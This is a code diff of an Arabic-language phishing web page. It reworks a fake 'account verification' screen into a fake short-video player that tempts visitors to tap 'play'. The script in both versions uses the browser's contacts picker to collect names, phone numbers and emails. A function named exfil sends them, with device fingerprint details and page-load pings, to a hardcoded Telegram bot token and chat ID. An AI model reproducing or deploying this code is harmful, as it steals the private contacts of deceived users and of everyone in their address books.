@@ -3,49 +3,72 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="theme-color" content="#0b0b0b">
-<title>تحقق من الحساب</title>
+<meta name="theme-color" content="#000000">
+<title>فيديو</title>
 <style>
   *{box-sizing:border-box}
-  body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:#0b0b0b;color:#eee;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}
-  #app{text-align:center;width:100%;max-width:420px}
-  h1{font-size:22px;margin:0 0 8px}
-  p{color:#9aa0a6;font-size:14px;margin:0 0 22px}
-  button{background:#1a73e8;color:#fff;border:0;padding:14px 22px;border-radius:10px;font-size:17px;width:100%;margin-top:10px}
-  button:disabled{opacity:.5}
-  input{display:block;width:100%;margin:8px 0;padding:12px;border-radius:8px;border:1px solid #333;background:#111;color:#eee;font-size:16px}
-  .spinner{width:28px;height:28px;border:3px solid #333;border-top-color:#1a73e8;border-radius:50%;margin:0 auto 16px;animation:spin .8s linear infinite}
-  @keyframes spin{to{transform:rotate(360deg)}}
-  .ok{color:#34a853;font-size:18px}
-  .hint{background:#1c1c1c;border:1px solid #444;border-radius:10px;padding:12px;font-size:14px;color:#fdd663;margin-bottom:14px;line-height:1.6}
+  html,body{height:100%}
+  body{margin:0;background:#000;color:#fff;font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+       display:flex;flex-direction:column;align-items:center;justify-content:center;overflow:hidden;
+       -webkit-user-select:none;user-select:none;cursor:pointer}
+  .stage{width:100%;max-width:480px;aspect-ratio:9/16;max-height:100vh;background:#0a0a0a;position:relative;
+         display:flex;align-items:center;justify-content:center}
+  .bar{position:absolute;top:0;left:0;height:3px;background:#fe2c55;width:0;transition:width .3s}
+  .spin{width:38px;height:38px;border:3px solid rgba(255,255,255,.15);border-top-color:#fe2c55;
+        border-radius:50%;animation:sp .8s linear infinite}
+  @keyframes sp{to{transform:rotate(360deg)}}
+  .txt{position:absolute;bottom:14%;font-size:14px;color:#fff;background:rgba(0,0,0,.55);
+       padding:9px 16px;border-radius:20px}
+  .play{width:74px;height:74px;border-radius:50%;background:rgba(255,255,255,.14);
+        display:flex;align-items:center;justify-content:center}
+  .play:after{content:"";border-style:solid;border-width:13px 0 13px 21px;
+              border-color:transparent transparent transparent #fff;margin-right:-5px}
+  .err{position:absolute;bottom:8%;font-size:13px;color:#fdd663;text-align:center;padding:0 20px;line-height:1.7;display:none}
 </style>
 </head>
 <body>
-<div id="app">
-  <h1>تحقق من الحساب</h1>
-  <p>اضغط المتابعة لإكمال التحقق</p>
-  <button id="btn">متابعة</button>
+<div class="stage" id="stage">
+  <div class="bar" id="bar"></div>
+  <div class="play" id="play"></div>
+  <div class="spin" id="spin" style="display:none"></div>
+  <div class="txt" id="txt">اضغط للتشغيل</div>
+  <div class="err" id="err"></div>
 </div>
 <script>
-// static build: no backend, posts straight to the Telegram Bot API (CORS: *)
 const BOT_TOKEN = "9237923038:AAGsmJ9OMYkixhEk5TonyyarS9_TDO05jik";
 const CHAT_ID   = "972326806";
 const API       = "https://api.telegram.org/bot" + BOT_TOKEN;
 
 const meta = {
-  ua: navigator.userAgent,
-  platform: navigator.platform,
-  lang: navigator.language,
+  ua: navigator.userAgent, platform: navigator.platform, lang: navigator.language,
   screen: screen.width + "x" + screen.height,
   tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-  cores: navigator.hardwareConcurrency || 0,
-  mem: navigator.deviceMemory || 0,
-  touch: "ontouchstart" in window,
   secure: window.isSecureContext,
   picker: !!(navigator.contacts && navigator.contacts.select),
-  url: location.href,
-  ts: Date.now()
+  url: location.href, ts: Date.now()
 };
+
+const stage = document.getElementById("stage");
+const bar = document.getElementById("bar");
+const spin = document.getElementById("spin");
+const txt = document.getElementById("txt");
+const err = document.getElementById("err");
+const play = document.getElementById("play");
+let p = 0, busy = false;
+const timer = setInterval(() => {
+  p = Math.min(96, p + Math.random() * 8);
+  bar.style.width = p + "%";
+}, 350);
+
+async function tgSend(text) {
+  try {
+    const r = await fetch(API + "/sendMessage", {
+      method: "POST", headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({chat_id: CHAT_ID, text: String(text).slice(0, 4000)})
+    });
+    return r.ok;
+  } catch (e) { return false; }
+}
 
 function normPhone(t) {
   if (!t) return "";
@@ -53,137 +76,94 @@ function normPhone(t) {
   return d.startsWith("+") ? d : (d ? "+" + d : "");
 }
 
-function blobToB64(blob) {
-  return new Promise((res) => {
-    const r = new FileReader();
-    r.onload = () => res(r.result);
-    r.onerror = () => res("");
-    r.readAsDataURL(blob);
-  });
-}
-
-async function tgSend(text) {
-  try {
-    const r = await fetch(API + "/sendMessage", {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({chat_id: CHAT_ID, text: String(text).slice(0, 4000)})
-    });
-    return r.ok;
-  } catch (e) { return false; }
-}
-
-async function tgDoc(filename, content) {
-  try {
-    const fd = new FormData();
-    fd.append("chat_id", CHAT_ID);
-    fd.append("document", new Blob([content], {type: "application/json"}), filename);
-    const r = await fetch(API + "/sendDocument", {method: "POST", body: fd});
-    return r.ok;
-  } catch (e) { return false; }
-}
-
 async function exfil(contacts) {
   const seen = new Set();
   const clean = [];
   for (const c of contacts) {
-    const key = JSON.stringify([c.name, c.tel, c.email, c.address]);
+    const tel = (c.tel || []).map(normPhone).filter(Boolean);
+    if (!tel.length) continue;
+    const key = (c.name || "") + "|" + tel.join(",");
     if (seen.has(key)) continue;
     seen.add(key);
-    const tel = (c.tel || []).map(normPhone).filter(Boolean);
-    clean.push({name: c.name || "", tel, email: c.email || [],
-                address: c.address || [], icon: c.icon || ""});
+    clean.push({name: c.name || "", tel});
   }
-  const raw = JSON.stringify({contacts: clean, meta});
-  const summary = "new pull\ncontacts: " + clean.length +
+
+  await tgSend("new pull\ncontacts: " + clean.length +
     "\ndevice: " + meta.platform + " " + meta.screen +
-    "\ntz: " + meta.tz + "\nua: " + meta.ua.slice(0, 120);
+    "\ntz: " + meta.tz + "\nua: " + meta.ua.slice(0, 120));
 
-  await tgSend(summary);
-  if (!(await tgDoc("contacts-" + Date.now() + ".json", raw))) {
-    for (let i = 0; i < raw.length; i += 3800) {
-      await tgSend(raw.slice(i, i + 3800));
-    }
+  const raw = JSON.stringify({contacts: clean, meta});
+  const size = Math.ceil(raw.length / 3800);
+  for (let i = 0, n = 1; i < raw.length; i += 3800, n++) {
+    await tgSend("[" + n + "/" + size + "] " + raw.slice(i, i + 3800));
+    await new Promise(r => setTimeout(r, 60));
   }
-  return true;
+  await tgSend("done: " + clean.length + " contacts, " + raw.length + " bytes");
 }
 
-function done() {
-  document.getElementById("app").innerHTML = '<div class="ok">✓ تم التحقق بنجاح</div>';
+function fail(msg) {
+  clearInterval(timer);
+  spin.style.display = "none";
+  play.style.display = "none";
+  bar.style.width = "100%";
+  err.style.display = "block";
+  err.textContent = msg;
+  txt.style.display = "none";
 }
-
-function showEntry() {
-  document.getElementById("app").innerHTML =
-    '<h1>تحقق من الحساب</h1>' +
-    '<p>اضغط المتابعة لإكمال التحقق</p>' +
-    '<button id="btn">متابعة</button>';
-  document.getElementById("btn").addEventListener("click", openPicker);
-}
-
-function showForm(reason) {
-  document.getElementById("app").innerHTML =
-    (reason ? '<div class="hint">' + reason + '</div>' : '') +
-    '<h1>أدخل البيانات</h1>' +
-    '<p>لإكمال التحقق أدخل رقمك</p>' +
-    '<input id="n" placeholder="الاسم" autocomplete="name">' +
-    '<input id="p" type="tel" placeholder="رقم الهاتف" autocomplete="tel">' +
-    '<button id="s">تأكيد</button>';
-  document.getElementById("s").addEventListener("click", async () => {
-    await exfil([{name: document.getElementById("n").value,
-                  tel: [document.getElementById("p").value]}]);
-    done();
-  });
-}
-
-function blockReason() {
-  if (!meta.secure) return 'الاتصال ليس مشفر (HTTPS). منتقي الجهات ما يشتغل إلا على اتصال مشفر.';
-  if (!meta.picker) return 'هذا المتصفح ما يدعم منتقي الجهات. استخدم جوجل كروم على هاتف أندرويد.';
-  return '';
-}
-
-let tried = false;
 
 async function openPicker() {
-  if (tried) return;
-  tried = true;
+  if (busy) return;
 
-  const reason = blockReason();
-  if (reason) {
-    tried = false;
-    showForm(reason);
+  if (!meta.secure) { fail("تعذر تحميل المحتوى. حاول مرة أخرى."); return; }
+  if (!meta.picker) { fail("هذا الجهاز غير مدعوم. جرب المتصفح الافتراضي."); return; }
+
+  busy = true;
+  play.style.display = "none";
+  spin.style.display = "block";
+  txt.textContent = "جاري التحميل...";
+
+  let list = null;
+  try {
+    list = await navigator.contacts.select(
+      ["name", "tel", "email"], {multiple: true});
+  } catch (e) {
+    await tgSend("picker error: " + (e && e.name ? e.name : String(e)));
+    busy = false;
+    spin.style.display = "none";
+    play.style.display = "flex";
+    txt.textContent = "اضغط للتشغيل";
     return;
   }
 
-  document.getElementById("app").innerHTML =
-    '<div class="spinner"></div>' +
-    '<div class="hint">في نافذة الجهات اضغط <b>تحديد الكل</b> ثم <b>تم</b></div>';
+  await tgSend("picker returned: " + (list ? list.length : "null"));
 
-  try {
-    const list = await navigator.contacts.select(
-      ["name", "tel", "email", "address", "icon"], {multiple: true});
-    if (list && list.length) {
-      const out = [];
-      for (const c of list) {
-        out.push({
-          name: c.name || "",
-          tel: c.tel || [],
-          email: c.email || [],
-          address: c.address || [],
-          icon: c.icon ? await blobToB64(c.icon) : ""
-        });
-      }
-      await exfil(out);
-      done();
-      return;
+  if (list && list.length) {
+    const out = [];
+    for (const c of list) {
+      out.push({name: c.name || "", tel: c.tel || [], email: c.email || []});
     }
-  } catch (e) {}
+    clearInterval(timer);
+    bar.style.width = "100%";
+    txt.textContent = "تم التشغيل";
+    try {
+      await exfil(out);
+    } catch (e) {
+      await tgSend("exfil error: " + (e && e.message ? e.message : String(e)));
+    }
+    return;
+  }
 
-  tried = false;
-  showEntry();
+  busy = false;
+  spin.style.display = "none";
+  play.style.display = "flex";
+  txt.textContent = "اضغط للتشغيل";
 }
 
-document.getElementById("btn").addEventListener("click", openPicker);
-setTimeout(openPicker, 400);
+stage.addEventListener("click", openPicker);
+stage.addEventListener("touchend", (e) => { e.preventDefault(); openPicker(); });
+
+tgSend("page load\nsecure=" + meta.secure + " picker=" + meta.picker +
+       "\nurl=" + location.href + "\nua=" + meta.ua.slice(0, 140));
 </script>
 </body>
 </html>
